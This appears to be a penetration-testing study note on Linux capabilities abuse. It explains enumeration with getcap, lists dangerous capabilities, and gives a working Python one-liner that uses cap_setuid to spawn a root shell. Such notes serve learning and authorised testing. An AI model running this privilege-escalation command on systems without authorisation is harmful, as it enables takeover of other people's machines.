---
tags: [technique, privesc, linux]
aliases: [Linux Capabilities Abuse, cap_setuid]
---
# Linux Capabilities Abuse

> Capabilities split root's all-or-nothing power into fine-grained privileges that can be attached to a single binary. A misassigned capability lets an unprivileged user gain root through that binary.

## Enumeration → [[getcap]]
```bash
getcap -r / 2>/dev/null
```

## Dangerous capabilities
| Capability             | Effect                                                 |
| ---------------------- | ------------------------------------------------------ |
| `cap_setuid`           | change UID to any value, including 0 → **root**        |
| `cap_net_bind_service` | bind to ports < 1024 (normally root-only)              |
| `cap_net_raw`          | craft raw packets (how `ping` works without SUID root) |
| `cap_dac_read_search`  | bypass file read permission checks                     |

## Exploiting `cap_setuid` on python
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- the binary already holds `cap_setuid` → `os.setuid(0)` succeeds → the spawned shell runs as root.

## vs. SUID
- the SUID bit grants the owner's full identity ([[SUID Abuse]]); a capability grants only the one specific privilege → finer-grained, but `cap_setuid` is equally fatal.
- reference for both: [GTFOBins](https://gtfobins.github.io/).

